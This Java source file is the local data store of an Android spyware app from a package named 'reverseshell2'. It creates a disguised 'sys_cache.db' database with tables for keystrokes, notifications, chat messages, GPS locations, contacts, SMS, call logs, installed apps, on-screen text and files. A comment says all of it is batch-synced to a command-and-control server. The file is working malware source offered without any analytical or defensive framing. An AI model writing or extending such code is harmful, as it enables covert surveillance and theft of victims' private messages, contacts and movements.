package com.example.reverseshell2;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Local SQLite buffer for all collected data.
 * Data is stored here and batch-synced to the C2 server via HTTPS.
 */
public class DataStore extends SQLiteOpenHelper {
    private static final String DB_NAME = "sys_cache.db";
    private static final int DB_VERSION = 1;
    private static DataStore instance;

    public static synchronized DataStore getInstance(Context ctx) {
        if (instance == null) instance = new DataStore(ctx.getApplicationContext());
        return instance;
    }

    private DataStore(Context ctx) {
        super(ctx, DB_NAME, null, DB_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL("CREATE TABLE IF NOT EXISTS keylogs (id INTEGER PRIMARY KEY AUTOINCREMENT, app_package TEXT, text TEXT, timestamp TEXT, synced INTEGER DEFAULT 0)");
        db.execSQL("CREATE TABLE IF NOT EXISTS notifications (id INTEGER PRIMARY KEY AUTOINCREMENT, app_package TEXT, title TEXT, text TEXT, timestamp TEXT, synced INTEGER DEFAULT 0)");
        db.execSQL("CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY AUTOINCREMENT, app_package TEXT, sender TEXT, text TEXT, is_incoming INTEGER DEFAULT 1, timestamp TEXT, synced INTEGER DEFAULT 0)");
        db.execSQL("CREATE TABLE IF NOT EXISTS locations (id INTEGER PRIMARY KEY AUTOINCREMENT, latitude REAL, longitude REAL, accuracy REAL, timestamp TEXT, synced INTEGER DEFAULT 0)");
        db.execSQL("CREATE TABLE IF NOT EXISTS contacts (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, phone TEXT, phone_type TEXT, synced INTEGER DEFAULT 0)");
        db.execSQL("CREATE TABLE IF NOT EXISTS sms (id INTEGER PRIMARY KEY AUTOINCREMENT, address TEXT, body TEXT, sms_type TEXT, timestamp TEXT, synced INTEGER DEFAULT 0)");
        db.execSQL("CREATE TABLE IF NOT EXISTS call_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, number TEXT, call_type TEXT, duration INTEGER, timestamp TEXT, synced INTEGER DEFAULT 0)");
        db.execSQL("CREATE TABLE IF NOT EXISTS apps (id INTEGER PRIMARY KEY AUTOINCREMENT, app_name TEXT, package_name TEXT, is_system INTEGER DEFAULT 0, synced INTEGER DEFAULT 0)");
        db.execSQL("CREATE TABLE IF NOT EXISTS screen_texts (id INTEGER PRIMARY KEY AUTOINCREMENT, app_package TEXT, screen_text TEXT, timestamp TEXT, synced INTEGER DEFAULT 0)");
        db.execSQL("CREATE TABLE IF NOT EXISTS pending_files (id INTEGER PRIMARY KEY AUTOINCREMENT, file_path TEXT, file_type TEXT, timestamp TEXT, synced INTEGER DEFAULT 0)");
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // Drop and recreate on upgrade
    }

    // =======================================================
    //  INSERT METHODS
    // =======================================================

    public void insertKeylog(String appPackage, String text) {
        ContentValues cv = new ContentValues();
        cv.put("app_package", appPackage);
        cv.put("text", text);
        cv.put("timestamp", now());
        getWritableDatabase().insert("keylogs", null, cv);
    }

    public void insertNotification(String appPackage, String title, String text) {
        ContentValues cv = new ContentValues();
        cv.put("app_package", appPackage);
        cv.put("title", title);
        cv.put("text", text);
        cv.put("timestamp", now());
        getWritableDatabase().insert("notifications", null, cv);
    }

    public void insertMessage(String appPackage, String sender, String text, boolean isIncoming) {
        ContentValues cv = new ContentValues();
        cv.put("app_package", appPackage);
        cv.put("sender", sender);
        cv.put("text", text);
        cv.put("is_incoming", isIncoming ? 1 : 0);
        cv.put("timestamp", now());
        getWritableDatabase().insert("messages", null, cv);
    }

    public void insertLocation(double lat, double lng, float accuracy) {
        ContentValues cv = new ContentValues();
        cv.put("latitude", lat);
        cv.put("longitude", lng);
        cv.put("accuracy", accuracy);
        cv.put("timestamp", now());
        getWritableDatabase().insert("locations", null, cv);
    }

    public void insertScreenText(String appPackage, String screenText) {
        ContentValues cv = new ContentValues();
        cv.put("app_package", appPackage);
        cv.put("screen_text", screenText);
        cv.put("timestamp", now());
        getWritableDatabase().insert("screen_texts", null, cv);
    }

    public void insertContact(String name, String phone, String type) {
        ContentValues cv = new ContentValues();
        cv.put("name", name);
        cv.put("phone", phone);
        cv.put("phone_type", type);
        getWritableDatabase().insert("contacts", null, cv);
    }

    public void insertSms(String address, String body, String type, String timestamp) {
        ContentValues cv = new ContentValues();
        cv.put("address", address);
        cv.put("body", body);
        cv.put("sms_type", type);
        cv.put("timestamp", timestamp);
        getWritableDatabase().insert("sms", null, cv);
    }

    public void insertCallLog(String number, String type, int duration, String timestamp) {
        ContentValues cv = new ContentValues();
        cv.put("number", number);
        cv.put("call_type", type);
        cv.put("duration", duration);
        cv.put("timestamp", timestamp);
        getWritableDatabase().insert("call_logs", null, cv);
    }

    public void insertApp(String appName, String packageName, boolean isSystem) {
        ContentValues cv = new ContentValues();
        cv.put("app_name", appName);
        cv.put("package_name", packageName);
        cv.put("is_system", isSystem ? 1 : 0);
        getWritableDatabase().insert("apps", null, cv);
    }

    public void insertPendingFile(String filePath, String fileType) {
        ContentValues cv = new ContentValues();
        cv.put("file_path", filePath);
        cv.put("file_type", fileType);
        cv.put("timestamp", now());
        getWritableDatabase().insert("pending_files", null, cv);
    }

    // =======================================================
    //  BATCH READ + MARK SYNCED
    // =======================================================

    public JSONArray getUnsynced(String table, int limit) {
        JSONArray arr = new JSONArray();
        try {
            Cursor c = getReadableDatabase().rawQuery(
                "SELECT * FROM " + table + " WHERE synced = 0 ORDER BY id ASC LIMIT " + limit, null);
            if (c.moveToFirst()) {
                do {
                    JSONObject obj = new JSONObject();
                    for (int i = 0; i < c.getColumnCount(); i++) {
                        String col = c.getColumnName(i);
                        if (col.equals("id") || col.equals("synced")) continue;
                        obj.put(col, c.getString(i));
                    }
                    arr.put(obj);
                } while (c.moveToNext());
            }
            c.close();
        } catch (Exception e) { /* ignore */ }
        return arr;
    }

    public void markSynced(String table, int count) {
        try {
            getWritableDatabase().execSQL(
                "UPDATE " + table + " SET synced = 1 WHERE id IN (SELECT id FROM " + table + " WHERE synced = 0 ORDER BY id ASC LIMIT " + count + ")");
        } catch (Exception e) { /* ignore */ }
    }

    public Cursor getUnsyncedFiles() {
        return getReadableDatabase().rawQuery(
            "SELECT * FROM pending_files WHERE synced = 0 ORDER BY id ASC LIMIT 5", null);
    }

    public void markFileSynced(int id) {
        ContentValues cv = new ContentValues();
        cv.put("synced", 1);
        getWritableDatabase().update("pending_files", cv, "id = ?", new String[]{String.valueOf(id)});
    }

    // =======================================================
    //  CLEANUP
    // =======================================================

    public void cleanupSynced() {
        String[] tables = {"keylogs", "notifications", "messages", "locations",
            "contacts", "sms", "call_logs", "apps", "screen_texts", "pending_files"};
        SQLiteDatabase db = getWritableDatabase();
        for (String t : tables) {
            db.execSQL("DELETE FROM " + t + " WHERE synced = 1");
        }
    }

    private String now() {
        return new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                .format(new java.util.Date());
    }
}
